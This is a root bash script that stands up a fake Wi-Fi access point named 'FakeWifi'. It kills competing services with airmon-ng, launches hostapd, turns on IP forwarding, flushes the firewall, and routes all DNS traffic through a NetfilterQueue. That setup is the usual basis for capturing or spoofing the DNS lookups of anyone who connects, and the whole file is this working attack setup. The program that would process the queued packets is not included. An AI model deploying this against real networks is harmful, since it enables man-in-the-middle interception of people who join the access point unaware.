#!/bin/bash

if [[ $EUID -ne 0 ]]; then
   echo "This script must be run as root."
   exit 1
fi

# Define variables
INTERFACE="wlan0"
GATEWAY="192.168.1.1"
SUBNET="255.255.255.0"
HOSTAPD_CONF=/home/jacob/ExecutablesByJacob/hostapd.conf

# Stop interfering services
airmon-ng check kill

# Assign static IP and bring up the interface
ifconfig $INTERFACE $GATEWAY netmask $SUBNET up

# Start hostapd
echo "Starting hostapd..."
hostapd $HOSTAPD_CONF &

# Enable IP forwarding
echo "Enabling IP forwarding..."
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables rules to split DNS traffic
echo "Redirecting DNS packets to separate NetfilterQueues..."
iptables -F
iptables -t nat -F
iptables -I OUTPUT -p udp --dport 53 -j NFQUEUE --queue-num 0   # Outgoing DNS requests
iptables -I INPUT -p udp --sport 53 -j NFQUEUE --queue-num 0    # Incoming DNS responses

iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 0

echo "Fake access point is running. Connect to SSID: FakeWifi"
